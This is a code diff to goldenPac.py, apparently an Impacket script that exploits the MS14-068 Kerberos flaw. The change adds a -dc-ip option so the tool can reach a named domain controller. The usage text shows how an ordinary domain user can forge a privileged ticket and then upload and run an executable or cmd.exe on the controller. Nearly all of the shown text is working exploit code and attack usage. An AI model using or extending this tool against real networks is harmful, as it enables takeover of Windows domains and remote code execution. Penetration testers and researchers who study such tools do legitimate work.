@@ -614,7 +614,7 @@ class MS14_068():
             ('Data', PKERB_VALIDATION_INFO),
         )
 
-    def __init__(self, target, kdchost = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None):
+    def __init__(self, target, kdchost = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None, kdcHost=None):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -626,6 +626,10 @@ class MS14_068():
         self.__copyFile = copyFile
         self.__command = command
         self.__writeTGT = writeTGT
+        if kdcHost is not None:
+            self.__kdcHost = kdcHost
+        else:
+            self.__kdcHost = domain
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
             self.__lmhash = self.__lmhash.decode('hex')
@@ -957,7 +961,7 @@ class MS14_068():
         return r, cipher, sessionKey, newSessionKey
 
     def getUserSID(self):
-        stringBinding = r'ncacn_np:%s[\pipe\samr]' % self.__domain
+        stringBinding = r'ncacn_np:%s[\pipe\samr]' % self.__kdcHost
 
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
 
@@ -1078,6 +1082,7 @@ if __name__ == '__main__':
     parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
     parser.add_argument('-c', action='store',metavar = "pathname",  help='uploads the filename for later execution, arguments are passed in the command option')
     parser.add_argument('-w', action='store',metavar = "pathname",  help='writes the golden ticket in CCache format into the <pathname> file')
+    parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Adress of the domain controller you want to attack. If ommited it will be taken from the domain specified in the target parameter')
 
     group = parser.add_argument_group('authentication')
 
@@ -1089,9 +1094,10 @@ if __name__ == '__main__':
         print "\tthe password will be asked, or\n"
         print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-dc\n"
         print "\tif domain.net and/or domain-dc does not resolve, add them"
-        print "\tto the hosts file\n"
-        print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-dc param1 param2 paramn\n"
+        print "\tto the hosts file or explicity specify the domain IP (e.g. 1.1.1.1):\n"
+        print "\tpython goldenPac.py -dc-ip 1.1.1.1 domain.net/normaluser:mypwd@domain-dc\n"
         print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
+        print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-dc param1 param2 paramn\n"
         sys.exit(1)
  
     options = parser.parse_args()
@@ -1111,7 +1117,7 @@ if __name__ == '__main__':
     if commands == ' ':
         commands = 'cmd.exe'
 
-    dumper = MS14_068(address, None, username, password, domain, options.hashes, commands, options.c, options.w)
+    dumper = MS14_068(address, None, username, password, domain, options.hashes, commands, options.c, options.w, options.dc_ip)
 
     try:
         dumper.exploit()
